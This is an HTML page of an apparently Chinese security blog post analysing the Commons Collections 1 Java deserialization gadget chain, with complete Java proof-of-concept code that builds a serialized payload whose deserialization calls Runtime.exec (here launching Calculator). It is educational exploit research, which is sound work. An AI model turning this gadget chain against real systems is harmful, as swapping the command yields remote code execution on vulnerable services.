@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="wk" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      CommonCollections1链分析 
+      
+      
+      |
+    
+     wEik1&#39;blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/avatar4.png">
+    <link rel="icon" href="/images/avatar4.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="wEik1'blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img no-lazy src="/images/avatar4.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">wEik1</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">CommonCollections1链分析</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-01-26 10:37:48
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                    <b>#</b> JAVA安全
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                    <b>#</b> JAVA安全
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化">
+                    <b>#</b> 反序列化
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/CommonCollections1/" title="CommonCollections1">
+                    <b>#</b> CommonCollections1
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>CC1 链的关键在三个实现了Transformer接⼝的类 ChainedTransformer ConstantTransformer InvokerTransformer，Transformer 顾名思义就是一个转换器用来处理传入的对象，然后将处理完的对象返回。</p>
+<p>** commons-collections-3.1.jar!/org/apache/commons/collections/Transformer.class **</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections1%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210126111742092.png" alt="image-20210126111742092"></p>
+<h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>先来看  InvokerTransformer 类是如何实现 transform 方法的</p>
+<p>org.apache.commons.collections.functors.InvokerTransformer.class#transform()</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections1%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210126111944377.png" alt="image-20210126111944377"></p>
+<p>获取传入对象的类，接着利用反射执行类中的任意方法，其中 this.iMethodName, this.iParamTypes, this.iArgs 都是可控的在构造函数中赋值。 这部分就是 CC1 链最终执行命令的地方，传入一个 Runtime 类对象，利用反射执行 exec 方法。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections1%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210126112806087.png" alt="image-20210126112806087"></p>
+<p>所以直接找到⼀个类，它在反序列化的 readObject 里直接或间接调用了 InvokerTransformer 的 transform 方法,并且参数可控，是这样吗？肯定不是我们都知道待序列化的对象和所有它使⽤的内部属性对象，必须都实现了 <strong>java.io.Serializable</strong> 接⼝。我们需要传给 transform 方法的参数是 Runtime 对象，在序列化的时候肯定也属于内部属性对象，而它是没有实现  <strong>java.io.Serializable</strong> 接⼝的，所以即使找到了符合条件的类也没办法构造成序列化数据。</p>
+<h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p>接着来看第二个  ChainedTransformer 类是如何实现 transform 接口的</p>
+<p>org.apache.commons.collections.functors.ChainedTransformer.class#transform()</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections1%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210126145247617.png" alt="image-20210126145247617"></p>
+<p>按顺序调用 Transformer 数组  this.iTransformers 中所有 Transformer 对象的 transform 方法，并且每次调用的结果传递给下一个 Transformer#transform() 作为参数。就像一个车间，每个工人处理完零件后交给下一个环节的工人处理，最后输出成品。</p>
+<p>利用它我们可以构造 Transformer 数组 通过 ChainedTransformer#transform() 的链式调用机制+java的反射机制在反序列化时构造出 Runtime 对象，而不是在序列化之前就实例化  Runtime 对象。这样就可以解决 Runtime 不能序列化的问题。</p>
+<p>这是通过反射获取 Runtime 对象的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Method getRuntimeMethod &#x3D; clazz.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">Runtime runtime &#x3D; (Runtime) getRuntimeMethod.invoke(null);</span><br><span class="line">runtime.exec(&quot;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;);</span><br></pre></td></tr></table></figure>
+<p>用 ChainedTransformer#transform() 链式调用机制的写法就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">        new InvokerTransformer(</span><br><span class="line">                &quot;forName&quot;,</span><br><span class="line">                new Class[] &#123;String.class&#125;,</span><br><span class="line">                new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;</span><br><span class="line">        ),</span><br><span class="line">        new InvokerTransformer(</span><br><span class="line">                &quot;getMethod&quot;,</span><br><span class="line">                new Class[] &#123;String.class,Class[].class&#125;,</span><br><span class="line">                new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;</span><br><span class="line">        ),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">                Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                null, new Object[0] &#125;),</span><br><span class="line">        new InvokerTransformer(</span><br><span class="line">                &quot;exec&quot;,</span><br><span class="line">                new Class[] &#123;String.class&#125;,</span><br><span class="line">                new String[]&#123;&quot;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);</span><br><span class="line">chainedTransformer.transform(Class.class);</span><br></pre></td></tr></table></figure>
+<p>最后调用 ChainedTransformer#transform() 即可,参数为 class对象(Class.class) </p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections1%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210126162519139.png" alt="image-20210126162519139"></p>
+<p>把 chainedTransformer 序列化试试</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections1%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210126163910723.png" alt="image-20210126163910723"></p>
+<p>没报错，现在还需要找到一个类，在反序列化的 readObject 里直接或间接调用了 ChainedTransformer 的 transform 方法</p>
+<p>并且调用 transform() 方法是参数可控，因为链式调用的起点 为 class对象(Class.class)，是我们传入 transform() 方法的参数。这样条件有些苛刻了，即使参数可控，参数类型也对不上。继续想办法减少条件。</p>
+<h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>我们看 ConstantTransformer 是如何实现 Transformer 接口的，直接返回了 this.iConstant ，this.iConstant 是在实例化对象时在构造函数里传⼊的⼀个对象。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections1%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210126175849253.png" alt="image-20210126175849253"></p>
+<p>简单来说它的作用就是 包裹一个对象，在调用其 transform 方法时返回这个对象。</p>
+<p>前边说到使用 ChainedTransformer#transform() 方法链式调用的起点是传入 transform() 方法的参数，也就是 class 对象(Class.class)。我们用 ConstantTransformer 包裹一个 class 对象,把它放到我们构造的 Transformer 数组的首位，作为链式调用的起点。</p>
+<p>随便传入一个参数都能调用成功。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections1%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210126182108659.png" alt="image-20210126182108659"></p>
+<p>现在我们只需要找到一个类，在反序列化的 readObject 里直接或间接调用了 ChainedTransformer 的 transform 方法即可。</p>
+<h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p><strong>ysoserial</strong> 使用的是AnnotationInvocationHandler+LazyMap#get()。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">				Map(Proxy).entrySet()</span><br><span class="line">					AnnotationInvocationHandler.invoke()</span><br><span class="line">						LazyMap.get()</span><br></pre></td></tr></table></figure>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections1%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210127102954057.png" alt="image-20210127102954057"></p>
+<p> AnnotationInvocationHandler 类的 readObject 方法中并没有直接调用到 Map 的 get 方法，但是在 AnnotationInvocationHandler#invoke() 方法调用了 get 方法，this.memberValues 可控。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections1%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210127104206924.png" alt="image-20210127104206924"></p>
+<p>那么如何调用 AnnotationInvocationHandler#invoke() 方法呢？这部分涉及到 java 的动态代理。创建一个 AnnotationInvocationHandler 的代理类，当调用 AnnotationInvocationHandler 的代理类里的任意方法时都会先调用 AnnotationInvocationHandler#invoke() 方法，有点像php里的 _call() 只不过 _call() 在调用不存在的方法才触发。</p>
+<p>所以现在的思路<br>创建一个 LazyMap 对象，设置 factory 为我们构造好的 ChainedTransformer，这样调用LazyMap#ge t()时就会调用  factory.transform() 即 ChainedTransformer.transform()。</p>
+<p>创建一个 AnnotationInvocationHandler 类，设置 this.memberValues 为我们构造的 LazyMap，注意看 AnnotationInvocationHandler 的构造函数，第一个参数必须是注释，否则进不到 if 里赋值</p>
+<p>接着为我们构造好的 AnnotationInvocationHandler 对象创建一个代理，然后只要调用代理后的对象中的任意方法即可出发 AnnotationInvocationHandler#invoke() 方法</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections1%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210127112129654.png" alt="image-20210127112129654"></p>
+<p>代码:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.jboss.weld.manager.Transform;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Repeatable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Class.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">&quot;forName&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;java.lang.Runtime&quot;</span>&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> String[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(1);</span></span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例一个 AnnotationInvocationHandler 类</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      	<span class="comment">//这里第一个参数必须是注释类型的 </span></span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Repeatable.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 AnnotationInvocationHandler 的代理</span></span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用代理对象的任意方法</span></span><br><span class="line">        proxyMap.size();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections1%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210127112701877.png" alt="image-20210127112701877"></p>
+<p>这里代理对象是转换成了Map 类型，其实换成别的也是一样的</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections1%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210127121906963.png" alt="image-20210127121906963"></p>
+<p>最后只要随便找一个类，它的 readObject 方法有对我们的代理对象调用任意方法即可，满足这个条件的的类可太多了，<strong>ysoserial</strong> 中继续使用了 AnnotationInvocationHandler 类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.jboss.weld.manager.Transform;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Class.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">&quot;forName&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;java.lang.Runtime&quot;</span>&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> String[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(1);</span></span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例一个 AnnotationInvocationHandler 类</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 AnnotationInvocationHandler 的代理</span></span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在实例化一个 AnnotationInvocationHandler 包裹我们的代理对象 proxyMap</span></span><br><span class="line">         handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>成功弹出计算器</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections1%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210127142323276.png" alt="image-20210127142323276"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p> 分析完之后还是有很多疑问，最后得到的 poc 我 debug 的时候发现反序列化弹出计算器的过程，并没有按照我们的设想，而是在执行完 AbstractMapDecorator#entrySet()方法后触发的，在 invoke 中打的断点也是在弹出计算器之后才命中。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections1%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210127154823936.png" alt="image-20210127154823936"></p>
+<p>而在 ChainedTransformer#transform() 方法中打的断点根本就没有命中。然后我去看  <strong>ysoserial</strong> 中 CC1 链是如何构造的，发现逻辑是一样的，我们写的 poc 并没有问题。用 P 牛的 demo 也是一样的问题，令人疑惑.jpg</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/01/21/SSRF&FTP%E4%B8%BB%E5%8A%A8%E6%A8%A1%E5%BC%8F/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-01-26 10:37:48
+            </span>
+            
